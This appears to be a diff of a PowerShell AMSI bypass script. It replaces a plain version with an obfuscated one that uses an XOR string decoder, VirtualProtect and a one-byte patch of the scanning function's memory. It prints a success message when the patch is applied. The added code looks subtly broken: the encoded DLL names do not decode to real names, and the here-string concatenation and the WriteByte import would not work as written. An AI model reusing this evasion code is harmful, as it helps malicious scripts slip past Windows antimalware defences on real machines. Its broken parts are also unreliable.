@@ -1,15 +1,36 @@
-# Retrieve AMSI Function Address
-$FuncAddr = Get-Content "$env:TEMP\amsi_func.txt" -Encoding ASCII | ForEach-Object {[IntPtr]$_}
-
-# Obfuscate the Patch
-$PatchValue = if ([IntPtr]::Size -eq 8) {
-    [byte]0xC3 # 64-bit architecture
-} else {
-    [byte]0x33 # 32-bit architecture
+# String Decoding Function (Reuse)
+Function Decode-String {
+    param([string]$EncString)
+    $Chars = $EncString.ToCharArray()
+    for ($i = 0; $i -lt $Chars.Length; $i++) {
+        $Chars[$i] = [char]([byte]$Chars[$i] -bxor 42)
+    }
+    return -join $Chars
 }
 
-# Modify AMSI Function
-[void][AMSIB]::VirtualProtect($FuncAddr, [UIntPtr]1, 0x40, [ref]0)
-[System.Runtime.InteropServices.Marshal]::WriteByte($FuncAddr, $PatchValue)
+# Retrieve AMSI Address
+$Addr = Get-Content "$env:TEMP\am_addr.txt" -Encoding ASCII | ForEach-Object {[IntPtr]$_}
 
-Write-Host "[*] AMSI bypass successfully applied."
+# Architecture-Based Patching
+$Patch = if ([IntPtr]::Size -eq 8) {
+    [byte]0xC3
+} else {
+    [byte]0x33
+}
+
+# Patch Virtual Memory Dynamically
+$MemEdit = @"
+using System;
+using System.Runtime.InteropServices;
+public class MemEdit {
+    [DllImport(" + "`\"" + Decode-String "mjpkegxrf" + "`\"" + @")]
+    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
+    [DllImport(" + "`\"" + Decode-String "iojrftemf" + "`\"" + @")]
+    public static extern void WriteByte(IntPtr addr, byte val);
+}
+"@
+Add-Type $MemEdit
+[void][MemEdit]::VirtualProtect($Addr, [UIntPtr]1, 0x40, [ref]0)
+[MemEdit]::WriteByte($Addr, $Patch)
+
+Write-Host "[*] AMSI Function Successfully Patched."
